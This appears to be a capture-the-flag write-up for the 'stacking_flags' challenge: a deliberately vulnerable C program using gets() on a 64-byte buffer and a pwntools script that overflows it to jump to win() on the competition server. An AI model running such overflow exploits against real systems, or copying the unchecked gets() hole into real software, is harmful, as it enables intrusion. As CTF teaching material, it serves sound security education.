Given C code:

`stacking_flags.c`
```c
/*gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out*/

#include <stdio.h>
#include <stdlib.h>

void win() {
    FILE *fp;
    char flag[128];

    fp = fopen("flag.txt", "r");
    
    if (!fp) {
        puts("Could not open flag file.");
        fflush(stdout);
        exit(1);
    }
    
    fgets(flag, sizeof(flag), fp);
    puts(flag);
    fflush(stdout);
    fclose(fp);
    exit(0);
}

void vulnerable_function() {
    char buffer[64];
    gets(buffer);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    fflush(stdout);

    vulnerable_function();
    printf("win() is at: %p\n", win);
    printf("Better luck next time!\n");
    return 0;
}
```
Compile it according to the comment:
```
gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out
```

The script to run:

`script.py`:
```python
from pwn import *

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br main
		br vulnerable_function
		br *vulnerable_function+25
		''')

#nc.umbccd.net:8921
p = remote("nc.umbccd.net", 8921)

# p = process(exe.path)
# GDB()

win = p64(0x4011a6)
payload = b"A" * 64 + b"B" * 8 + win
p.sendline(payload)

p.interactive()
```

Output:
<img width="804" height="270" alt="image" src="https://github.com/user-attachments/assets/5c00be47-6f00-4de9-9b00-74f3d698043c" />
